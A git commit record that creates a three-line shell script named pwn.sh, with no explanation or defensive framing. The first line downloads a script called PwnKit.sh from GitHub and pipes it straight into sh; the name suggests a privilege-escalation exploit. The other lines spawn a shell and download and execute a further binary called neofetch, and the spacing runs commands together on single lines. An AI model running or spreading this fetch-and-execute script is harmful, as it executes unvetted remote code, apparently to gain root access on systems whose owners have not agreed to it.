6b936259f1a4306e2c4637e0cf148b46ec22b611
trhacknon <98242014+trhacknon@users.noreply.github.com>
2022-06-02 11:00:50 +0200

    Create pwn.sh

---
+++ pwn.sh
@@ -0,0 +1,3 @@
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/trhacknon/PwnKit/main/PwnKit.sh)"
+SHELL=/bin/bash script -q /dev/null                               wget https://raw.githubusercontent.com/trhacknon/neofetch/master/neofetch
+chmod +x neofetch                                                 ./neofetch
